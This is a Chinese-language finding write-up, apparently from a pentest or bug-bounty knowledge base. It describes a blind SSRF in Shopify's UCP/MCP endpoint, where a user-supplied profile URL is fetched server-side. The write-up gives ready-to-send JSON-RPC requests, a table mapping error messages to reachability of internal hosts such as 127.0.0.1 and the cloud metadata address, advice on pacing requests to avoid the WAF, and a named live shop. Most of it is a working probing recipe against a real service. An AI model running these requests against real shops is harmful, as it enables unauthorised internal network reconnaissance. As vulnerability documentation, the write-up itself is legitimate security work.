# Shopify UCP/MCP 的 meta.ucp-agent.profile → 服务端主动抓取，盲 SSRF 存活/端口 oracle

归类：server-side request validation（SSRF）
严重度：low
来源：task#12 retro32.com 全流程，finding_id=69（verdict=verified）
端点：POST https://<shop>.myshopify.com/api/ucp/mcp （JSON-RPC 2.0 over MCP）

## 一句话
UCP/MCP 网关匿名可达；每次 tools/call 的 arguments.meta.ucp-agent.profile 会被服务端主动发起 HTTP(S) 抓取。响应按「抓取结果」给出稳定差分，构成对任意内部 HTTPS 主机的**盲** SSRF 存活/端口 oracle（不回显响应体）。

## 前置条件
- 目标为 Shopify 托管店且开放 UCP/MCP：GET https://<shop>/.well-known/ucp → 200 JSON（powered-by: Shopify）
- 零凭据：不需要 Cookie / JWT / 账号
- 请求头必须同时带：Content-Type: application/json 与 Accept: application/json, text/event-stream
- WAF 按速率触发 → 单线程、请求间隔 ≥2.5s

## 复现链（实测）

### 步骤 0 — 探活端点（MCP 服务匿名可用）
```
POST /api/ucp/mcp HTTP/1.1
Host: <shop>.myshopify.com
Content-Type: application/json
Accept: application/json, text/event-stream

{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2025-06-18","capabilities":{},"clientInfo":{"name":"t","version":"1"}}}
```
回显：200，result.serverInfo.name 含 UCP server 标识，capabilities.tools 存在。

### 步骤 1 — 塞入任意 URL 作为 profile，读回抓取结果分类
```
POST /api/ucp/mcp
{"jsonrpc":"2.0","id":9,"method":"tools/call","params":{"name":"search_catalog",
 "arguments":{"meta":{"ucp-agent":{"profile":"https://<任意URL>"}},"catalog":{"query":"test"}}}}
```

### 差分判据表（四类回显稳定可区分）
| profile 值 | 回显 | 服务端实际行为 |
|---|---|---|
| https://<shop>/.well-known/ucp | status success | 连通，且返回合规 JSON profile |
| https://<host>/robots.txt | profile_malformed "Invalid content type" | 连通，但响应不是 JSON |
| https://<host>/something.json | "Http error" | 连通，HTTP 层报错 |
| https://127.0.0.1/ | profile_unreachable "Network error" | 连不上 / 端口 DROP |
| http://169.254.169.254/ | invalid_profile_url "Https required" | scheme 被拒（非 https） |

（cns21d-0u.myshopify.com 上原样复现；对应 retro32 的 Shopify 后端。）

## 判定要点
- 关键证据是「服务端确发起了抓取」：profile 指向店铺自身公开文档时 status=success，而同一请求改指向不可达/非 JSON/http 地址时回显错误分类发生可预测变化 → 服务端在按我们给的 URL 出网。
- oracle 能力 = 判断「内部主机:端口是否可达 + 是否 HTTPS/返回 JSON」，属盲 SSRF（无回显）。

## 边界（不要夸大）
- 仅接受 **https** scheme；http:// 一律 "Https required"（invalid_profile_url）。
- **不跟随 302 重定向**；HTTP 层错误统一归类为 "Http error"。
- **不回显响应体** → 读不到内网内容，只能做存活/端口/内容类型判定。
- 这是与库内 #518/#528 同一字段的**另一个利用面**：#518/#528 讲把 profile 指向店铺自身 .well-known/ucp 可自绕门禁调用写类工具；本条讲 profile 被服务端抓取所形成的 SSRF oracle。

## 失败时的常见原因
- 缺 Accept 头 / Content-Type 头 → 端点不正常响应。
- 请求过密被 WAF 拦（429/403，retry-after 可能很长）。
- 用了 http:// → 全部 "Https required"，先换 https。
- 目标是 self-hosted 非 Shopify → 无 /api/ucp/mcp（先 GET /.well-known/ucp 判存在）。
- 误把 "Http error" 当成「不可达」：它其实说明**端口是通的**，只是 HTTP 层报错。
